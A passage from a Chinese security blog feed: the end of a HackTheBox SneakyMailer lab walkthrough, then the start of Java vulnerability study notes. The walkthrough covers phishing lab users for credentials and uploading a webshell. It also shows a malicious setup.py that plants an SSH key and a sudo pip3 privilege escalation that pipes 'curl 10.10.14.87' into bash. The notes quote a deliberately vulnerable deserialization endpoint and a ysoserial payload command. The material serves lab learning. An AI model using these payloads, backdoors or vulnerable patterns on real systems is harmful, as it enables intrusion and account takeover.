Error"</span>)</span><br></pre></td></tr></table></figure><p>这里主要是更改<code>smtplib.SMTP(&#39;10.10.10.197&#39;,25)</code>。这样我们就能使用htb的smtp服务器进行发送邮件。同时<code>receivers</code>这个参数是支持python列表的。所以直接传入我们之前收集的所有email.最后内容直接给我们自己ip.看看会不会有点击劫持的信息发过来。</p><p>发现有post信息。那么再跑遍脚本,直接切换成nc接收<br><img src="/2020/07/16/hackthebox-SneakyMailer/1.PNG" alt></p><p>看起来paul用户的账号密码到手了。（经典钓鱼场景）<br>接下来因为这是邮箱用户，我们用imap账户成功登录<br>关于imap的<a href="https://www.atmail.com/blog/imap-101-manual-imap-sessions/" target="_blank" rel="noopener">命令执行 </a><br>看了这篇文章应该就会操作了。简单的说就是在每个命令前都要加个字母做前缀。然后执行<code>LOGIN</code>,<code>SELECT</code>等操作<br>第一步先查看namespace。然后发现我们的Personal Namespace有<code>INBOX.</code>存在。所以继续列  <code>INBOX.</code>下的文件夹。这样我们就可以选定一个文件夹了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~<span class="comment"># telnet 10.10.10.197 143</span></span><br><span class="line">Trying 10.10.10.197...</span><br><span class="line">Connected to 10.10.10.197.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING <span class="keyword">for</span> distribution information.</span><br><span class="line">a login paulbyrd ^(<span class="comment">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span></span><br><span class="line">* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check <span class="keyword">for</span> configuration errors with the FAM/Gamin library)</span><br><span class="line">a OK LOGIN Ok.</span><br><span class="line">n namespace</span><br><span class="line">* NAMESPACE ((<span class="string">"INBOX."</span> <span class="string">"."</span>)) NIL ((<span class="string">"#shared."</span> <span class="string">"."</span>)(<span class="string">"shared."</span> <span class="string">"."</span>))</span><br><span class="line">n OK NAMESPACE completed.</span><br><span class="line">A1 list <span class="string">"INBOX."</span> <span class="string">"*"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Trash"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Sent"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Deleted Items"</span></span><br><span class="line">* LIST (\HasNoChildren) <span class="string">"."</span> <span class="string">"INBOX.Sent Items"</span></span><br><span class="line">A1 OK LIST completed</span><br></pre></td></tr></table></figure><p>经过尝试发现只有INBOX.Sent Items里有<code>2 EXISTS</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g21 SELECT <span class="string">"INBOX.Sent Items"</span></span><br><span class="line">* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)</span><br><span class="line">* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited</span><br><span class="line">* 2 EXISTS</span><br><span class="line">* 0 RECENT</span><br><span class="line">* OK [UIDVALIDITY 589480766] Ok</span><br><span class="line">* OK [MYRIGHTS <span class="string">"acdilrsw"</span>] ACL</span><br><span class="line">g21 OK [READ-WRITE] Ok</span><br></pre></td></tr></table></figure><p>那么我们依次查看邮件主题与内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">f fetch 1:2 (BODY[HEADER.FIELDS (Subject)])</span><br><span class="line">* 1 FETCH (BODY[HEADER.FIELDS (<span class="string">"Subject"</span>)] &#123;27&#125;</span><br><span class="line">Subject: Password reset</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">* 2 FETCH (BODY[HEADER.FIELDS (<span class="string">"Subject"</span>)] &#123;27&#125;</span><br><span class="line">Subject: Module testing</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">f OK FETCH completed.</span><br><span class="line">F1 fetch 1 RFC822</span><br><span class="line">* 1 FETCH (RFC822 &#123;2167&#125;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: root &lt;root@debian&gt;</span><br><span class="line">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><br><span class="line">Subject: Password reset</span><br><span class="line">Date: Fri, 15 May 2020 13:03:37 -0500</span><br><span class="line">Importance: normal</span><br><span class="line">X-Priority: 3</span><br><span class="line">Content-Type: multipart/alternative;</span><br><span class="line">        boundary=<span class="string">"_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"</span></span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">Hello administrator, I want to change this password <span class="keyword">for</span> the developer accou=</span><br><span class="line">nt</span><br><span class="line"></span><br><span class="line">Username: developer</span><br><span class="line">Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br><span class="line"></span><br><span class="line">Please notify me when you <span class="keyword">do</span> it=20</span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">Content-Type: text/html; charset=<span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">&lt;html xmlns:o=3D<span class="string">"urn:schemas-microsoft-com:office:office"</span> xmlns:w=3D<span class="string">"urn:sc=</span></span><br><span class="line"><span class="string">hemas-microsoft-com:office:word"</span> xmlns:m=3D<span class="string">"http://schemas.microsoft.com/of=</span></span><br><span class="line"><span class="string">fice/2004/12/omml"</span> xmlns=3D<span class="string">"http://www.w3.org/TR/REC-html40"</span>&gt;&lt;head&gt;&lt;meta ht=</span><br><span class="line">tp-equiv=3DContent-Type content=3D<span class="string">"text/html; charset=3Dutf-8"</span>&gt;&lt;meta name=</span><br><span class="line">=3DGenerator content=3D<span class="string">"Microsoft Word 15 (filtered medium)"</span>&gt;&lt;style&gt;&lt;!--</span><br><span class="line">/* Font Definitions */</span><br><span class="line">@font-face</span><br><span class="line">        &#123;font-family:<span class="string">"Cambria Math"</span>;</span><br><span class="line">        panose-1:2 4 5 3 5 4 6 3 2 4;&#125;</span><br><span class="line">@font-face</span><br><span class="line">        &#123;font-family:Calibri;</span><br><span class="line">        panose-1:2 15 5 2 2 2 4 3 2 4;&#125;</span><br><span class="line">/* Style Definitions */</span><br><span class="line">p.MsoNormal, li.MsoNormal, div.MsoNormal</span><br><span class="line">        &#123;margin:0in;</span><br><span class="line">        margin-bottom:.0001pt;</span><br><span class="line">        font-size:11.0pt;</span><br><span class="line">        font-family:<span class="string">"Calibri"</span>,sans-serif;&#125;</span><br><span class="line">.MsoChpDefault</span><br><span class="line">        &#123;mso-style-type:<span class="built_in">export</span>-only;&#125;</span><br><span class="line">@page WordSection1</span><br><span class="line">        &#123;size:8.5in 11.0in;</span><br><span class="line">        margin:1.0in 1.0in 1.0in 1.0in;&#125;</span><br><span class="line">div.WordSection1</span><br><span class="line">        &#123;page:WordSection1;&#125;</span><br><span class="line">--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D<span class="string">"#954F72"</span>&gt;&lt;div cla=</span><br><span class="line">ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=</span><br><span class="line">e this password <span class="keyword">for</span> the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=</span><br><span class="line">p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=</span><br><span class="line">l&gt;Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=</span><br><span class="line">al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you <span class="keyword">do</span> i=</span><br><span class="line">t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=</span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--</span><br><span class="line">)</span><br><span class="line">F1 OK FETCH completed.</span><br><span class="line">F1 fetch 2 RFC822</span><br><span class="line">* 2 FETCH (RFC822 &#123;585&#125;</span><br><span class="line">To: low@debian</span><br><span class="line">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><br><span class="line">Subject: Module testing</span><br><span class="line">Message-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;</span><br><span class="line">Date: Wed, 27 May 2020 13:28:58 -0400</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101</span><br><span class="line"> Thunderbird/68.8.0</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=utf-8; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Content-Language: en-US</span><br><span class="line"></span><br><span class="line">Hello low</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your current task is to install, <span class="built_in">test</span> and <span class="keyword">then</span> erase every python module you </span><br><span class="line">find <span class="keyword">in</span> our PyPI service, <span class="built_in">let</span> me know <span class="keyword">if</span> you have any inconvenience.</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">F1 OK FETCH completed.</span><br></pre></td></tr></table></figure><p>第一份邮件泄露了一份用户密码<code>developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code>.第二个邮件泄露了一个用户。看起来可以继续进行账户密码的尝试了。</p><p>果不其然还是没有得到ssh的账户。但是developer可以登陆ftp。看了下发现里面是个dev文件夹。内容跟我们80端口的网页一致。<br>先把dev文件夹拖下来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget ftp://10.10.10.197:21/* --ftp-user=developer  --ftp-password=m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C  -r</span><br></pre></td></tr></table></figure><p>仔细一审发现都是静态文件。这点有点懵。不过文件夹名字倒是提醒了我一个疏忽的地方。那就是我忘记收集子域名了。于是wfuzz走起收集子域名。发现确实存在<code>dev.sneakycorp.htb</code></p><p>既然我们的ftp目录是对应的web目录。那就直接<code>mput</code>上传webshell即可。命令执行getshell.<br><img src="/2020/07/16/hackthebox-SneakyMailer/2.PNG" alt></p><p>小结下。这一部分总体上只有enum的内容。不过整体上收获挺大的。因为以前没怎么接触过smtp.现在借此机会接触smtp,imap熟悉了相对应的命令倒是挺不错的。</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>  接下来是提权部分。这里我重点关注pypi跟low.因为这两个用户在前阶段出现的频率比较高。</p><p>  首先很容易发现<code>/var/www</code>有四个文件夹<code>dev.sneakymailer.htb</code>,<code>pypi.sneakymailer.htb</code>,<code>sneakymailer.htb</code>跟html.其中dev跟html内容一致我们不用管。这里<code>pypi.sneakymailer.htb</code>倒是个挺难爆出来的子域名。那么先加到hosts里去。发现对应的原来就是之前的8080端口的服务。网页内容是个pypiserver 1.3.2.然后有两个内容都要密码。</p><p>看起来web页面没啥用。直接去pypi文件夹下找内容。发现一个.htpasswd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;</span><br></pre></td></tr></table></figure><p>查看hash-examples发现是apache apr hash.hashcat破解之。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1600  -a 0 --force  -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到<br><code>$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui</code><br>现在我们倒是能用这组账户登录8080的pypiserver。但是似乎还是没啥用。看来我们得去了解下pypiserver 作用<br><a href="https://pypi.org/project/pypiserver/#table-of-contents" target="_blank" rel="noopener">https://pypi.org/project/pypiserver/#table-of-contents</a><br>这里面 Uploading Packages Remotely 这个功能比较吸引眼球。假如我们能上传恶意package。应该就能执行命令了。<br>跑个linpeas.sh.看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pypi       691  0.1  0.6  36800 25764 ?        Ss   04:06   0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --<span class="built_in">disable</span>-fallback -o /var/www/pypi.sneakycorp.htb/packages</span><br><span class="line">low       1098  0.1  0.5  29952 20976 ?        Ss   04:07   0:00 /home/low/venv/bin/python /opt/scripts/low/install-modules.py</span><br></pre></td></tr></table></figure><p>看起来low用户的确在执行python modules的下载。那么接下来我们看看如何构建一个恶意的setup.py。<br>网上找个demo.准备一个写公钥的payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/low/.ssh/authorized_keys"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">"""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD1J7hVPxdMEhfE1XL2OOPjgQvKZGm68ldluK8TTW70AVRKxwvfUzOCJA4vPFgrzeJ5E27UTYatqxtxIDagHHjMtmkt+FFk62Xe8qO4pDlzQEjrSiXA/Ex82KHqlnDReaRHEEcc4CmtvzBVavB4o34CeTUYEG2N7OC1RbVUZkX9ULjodiaasubHG4lo5M2wYZ+1RjPxl/wupsEmPzB/SoSUgCAMra/tsd1jxhsJ0+m45puGKgv5Zb4IeWMATdd+Ea6v7J70YUns1E7Ciutn83jRw4efId4ZNJDGCA0GYKqaYLKsj/gA+evl/6asj8TQBgD516xFp2bpdGWuzy0sef2c22E6xS9Vs/uUpwC5T8hMlvjxtFIJE57dQz6JrJdwqQk1Jf3WQUoU6NfcRTampYVdrTHAatLccghgAS8ldA0vxO7hTzSDocO6iTfDqPrfRQfk7F0/geEP7KgoWKAJvBz1RQpmTvvhWa6lbESafIjzPPfN0e2I17CPSir/ek5fZh0= root@byc404"""</span>)</span><br><span class="line">        f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">"byc_404"</span>, </span><br><span class="line">    version=<span class="string">"0.0.1"</span>,</span><br><span class="line">    author=<span class="string">"byc"</span>,</span><br><span class="line">    author_email=<span class="string">"byc@bycsec.top"</span>,</span><br><span class="line">    description=<span class="string">"A small example package"</span>,</span><br><span class="line">    long_description=<span class="string">""</span>,</span><br><span class="line">    long_description_content_type=<span class="string">""</span>,</span><br><span class="line">    url=<span class="string">"https://github.com/pypa/sampleproject"</span>,</span><br><span class="line">    packages=setuptools.find_packages(),</span><br><span class="line">    classifiers=[</span><br><span class="line">    <span class="string">"Programming Language :: Python :: 3"</span>,</span><br><span class="line">    <span class="string">"License :: OSI Approved :: MIT License"</span>,</span><br><span class="line">    <span class="string">"Operating System :: OS Independent"</span>,</span><br><span class="line">    ],</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>然后是<code>~/.pypirc</code>文件。使用它有以下两个优势</p><blockquote><ol><li>It removes the need to enter a username/password when pushing to PyPI. 2. It simplifies command line usage when pushing packages to a non-default package repository (i.e. anywhere other than <a href="https://pypi.org/" target="_blank" rel="noopener">pypi.org</a>).</li></ol></blockquote><p>这样我们就不用重复输入用户密码。同时保证内容推向sneakycorp.htb所在的pypi仓库。<br>按照官网设定修改下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers &#x3D; local</span><br><span class="line"></span><br><span class="line">[local]</span><br><span class="line">repository: http:&#x2F;&#x2F;pypi.sneakycorp.htb:8080&#x2F;</span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure><p>先<code>chmod 600 .pypirc</code> 然后再执行以下命令来upload package。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py sdist register -r <span class="built_in">local</span> upload -r <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>虽然会提示这种操作方法已经<code>deprecated</code>了。但是不影响完成命令。<br>当然这样使用是因为靶机没安装twine.不过基于pypiserver是暴露在公网的。我们直接本地使用twine也可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py sdist bdist_wheel</span><br><span class="line"></span><br><span class="line">python3 -m twine upload –repository <span class="built_in">local</span> dist/*</span><br></pre></td></tr></table></figure><p>写入公钥即可ssh登录<br><img src="/2020/07/16/hackthebox-SneakyMailer/3.PNG" alt><br>收下user.txt.</p><p>这一部分pypiserver的使用挺有意思的。不过我这里试了不写公钥直接命令执行倒是没有用,感觉有点问题（也许是因为靶机动不动重启吧，毕竟刚出的靶机总是容易卡）</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>这一部分倒是过于简单了。由于前面搜索资料时搜到了<code>pip</code>的privesc.所以执行<code>sudo -l</code>发现可以pip3后就简单了<br><a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os;os.system('curl 10.10.14.87|bash')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/hackthebox-SneakyMailer/4.PNG" alt><br>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>整体上来说root之前的部分都算是新知识。邮件的部分挺有意思的。感觉非常接近真实实战。假如真的有用户安全意识不强点击了我们的链接就可以打开另一片天地了。<br>后面python的部分可能有点技穷了。不过确实算是python用于提权的常见手段。恶意包或者恶意py源码都可以导致提权发生。</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记-Java相关</title>
      <link href="2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/"/>
      <url>2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。</p><p>大体上打算从常见漏洞和框架使用两个方面学习。因为有语言基础就不谈比较基础的部分了。</p><a id="more"></a><h2 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h2><p>java比较常见的有特色的漏洞包括但不限于</p><ul><li>deserialization</li><li>xxe</li><li>SpEL</li><li>ssti</li><li>url bypass<br>……</li></ul><p>这里用JoyChou大佬的项目学习 <a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code</a><br>非常全面。</p><p>每种漏洞都有对应的源码。原先很多反序列的洞复现过但是没有看过源码。这里正好研究下。</p><h3 id="deserialization"><a href="#deserialization" class="headerlink" title="deserialization"></a>deserialization</h3><p>恶意及防范源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.joychou.config.Constants;</span><br><span class="line"><span class="keyword">import</span> org.joychou.security.AntObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.util.WebUtils.getCookie;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Deserialize RCE using Commons-Collections gadget.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2018-06-14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/deserialize"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64</span></span><br><span class="line"><span class="comment">     * Add the result to rememberMe cookie.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * http://localhost:8080/deserialize/rememberMe/vuln</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/rememberMe/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">rememberMeVul</span><span class="params">(HttpServletRequest request)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == cookie) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"No rememberMe cookie. Right?"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe = cookie.getValue();</span><br><span class="line">        <span class="keyword">byte</span>[] decoded = Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes = <span class="keyword">new</span> ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Are u ok?"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Check deserialize class using black 